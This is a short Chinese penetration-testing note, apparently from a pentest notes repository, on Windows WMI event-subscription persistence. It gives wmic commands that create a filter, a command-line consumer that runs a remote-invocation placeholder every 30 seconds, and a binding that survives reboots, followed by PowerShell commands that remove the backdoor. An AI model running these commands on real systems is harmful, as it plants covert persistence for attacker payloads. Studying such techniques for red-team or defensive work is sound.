	每隔30秒加载一次payload
	>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="BotFilter82", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
	>wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="BotConsumer23",CommandLineTemplate="远程调用(powershell,regsvr32,mshta等)"
	>wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"BotFilter82\"", Consumer="CommandLineEventConsumer.Name=\"BotConsumer23\""
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/524.png)

	重启维持
	卸载后门
	>Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='BotFilter82'" | Remove-WmiObject -Verbose
	>Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='BotConsumer23'" | Remove-WmiObject -Verbose
	>Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose